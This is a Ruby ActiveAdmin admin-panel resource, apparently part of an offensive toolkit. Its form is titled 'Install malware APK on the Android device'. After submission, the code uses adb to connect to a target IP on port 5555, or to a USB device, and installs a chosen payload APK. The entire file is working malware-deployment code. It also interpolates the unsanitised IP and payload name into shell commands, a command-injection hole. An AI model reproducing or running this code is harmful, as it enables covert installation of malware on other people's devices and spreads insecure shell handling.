ActiveAdmin.register ApkInstallation do
  menu priority: 4, label: "Install APK"

  form title: "Install malware APK on the Android device" do |f|
    inputs do
      f.input :target_ip
      f.input :apk_payload_id, :label => "APK Name", :as => :select, :collection => ApkPayload.all.map { |u| ["#{u.name}", u.id] }
    end

    para "Make sure the IP is reachable or the device is plugged in if USB is selected."
    actions
  end

  after_create do |apk_installation|
    begin
      @apk_payload = ApkPayload.find(apk_installation.apk_payload_id)
      adbDevices = `tools/platform-tools/adb.exe devices`.split("\n")
      adbTarget = apk_installation.target_ip
      if (adbTarget == "usb" and adbDevices.size > 1 and adbDevices.any? { |line| line.strip.end_with? "device" }) or adbDevices.any? { |line| line =~ /#{adbTarget}:5555\s+device/ }
        adbTarget = adbDevices.find { |line| line.strip.end_with? "device" }.split[0] if adbTarget == "usb"
      end
      if adbTarget.upcase == "USB"
        adbTarget = adbDevices.find { |line| line.strip.end_with? "device" }.split[0]
      else
        system("tools/platform-tools/adb kill-server")
        system("tools/platform-tools/adb.exe tcpip 5555")
        system("tools/platform-tools/adb connect #{adbTarget}")
        sleep 2
      end

      system("tools/platform-tools/adb -s #{adbTarget} install files/payloads/#{@apk_payload.name}.apk")
    rescue
      puts "Error installing APK."
    end
  end

  permit_params :target_ip, :status, :apk_payload_id
end
